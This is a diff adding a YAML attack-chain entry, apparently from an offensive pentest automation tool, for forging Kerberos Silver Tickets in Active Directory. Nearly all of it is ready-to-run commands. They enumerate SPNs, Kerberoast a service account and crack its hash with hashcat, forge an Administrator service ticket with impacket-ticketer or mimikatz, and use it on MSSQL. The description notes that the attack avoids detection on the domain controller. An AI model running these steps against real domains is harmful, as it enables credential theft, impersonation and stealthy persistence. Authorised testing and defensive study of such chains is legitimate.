@@ -1,0 +1,61 @@
+chain_id: silver_ticket
+title: "AD — Silver Ticket (forge a TGS for one service, no DC contact)"
+severity: HIGH
+tags: [ad, kerberos, silver-ticket, persistence, mimikatz, impacket]
+
+trigger:
+  any_of:
+    - { kind: "service_account_hash" }
+    - { kind: "kerberoast_cracked" }
+    - { service_pattern: "(?i)kerberos" }
+
+description: |
+  With the NT (or AES) hash of a service account you can forge a TGS
+  directly for any SPN that account holds — no TGT, no DC traffic, no
+  detection on the DC. Useful when DCSync is locked down but you got
+  one service account via cracked Kerberoast / SeBackup on a member.
+
+steps:
+  - id: 1
+    title: "Identify the SPN you want and the account that holds it"
+    command: |
+      impacket-GetUserSPNs -dc-ip $DC_IP DOMAIN/USER:'PASS'
+      # e.g. MSSQLSvc/sql01.DOMAIN:1433  →  account svc_sql
+
+  - id: 2
+    title: "Get the service account's NT hash (Kerberoast → crack, or SAM dump)"
+    command: |
+      impacket-GetUserSPNs -request -dc-ip $DC_IP DOMAIN/USER:'PASS' -outputfile spns.txt
+      hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
+
+  - id: 3
+    title: "Forge with impacket-ticketer"
+    command: |
+      impacket-ticketer -nthash <SVC_NT> \
+        -domain-sid S-1-5-21-... -domain DOMAIN \
+        -spn 'MSSQLSvc/sql01.DOMAIN:1433' Administrator
+      export KRB5CCNAME=Administrator.ccache
+
+  - id: 4
+    title: "Forge with mimikatz"
+    command: |
+      mimikatz "kerberos::golden /user:Administrator /domain:DOMAIN \
+        /sid:S-1-5-21-... /target:sql01.DOMAIN /service:MSSQLSvc \
+        /rc4:<SVC_NT> /ptt"
+
+  - id: 5
+    title: "Use it — only against the forged service"
+    command: |
+      impacket-mssqlclient -k -no-pass sql01.DOMAIN -windows-auth
+
+common_errors:
+  - error: "Works on SMB but not on the intended service"
+    solution: |
+      SPN format mismatch — must match exactly what the service
+      registers. Check with `setspn -L svc_sql`. AES vs RC4 also
+      matters; if the account has AES enabled, RC4 tickets can be
+      rejected by `KrbtgtFullPacSignature`-aware DCs.
+
+references:
+  - https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver
+  - https://adsecurity.org/?p=2011
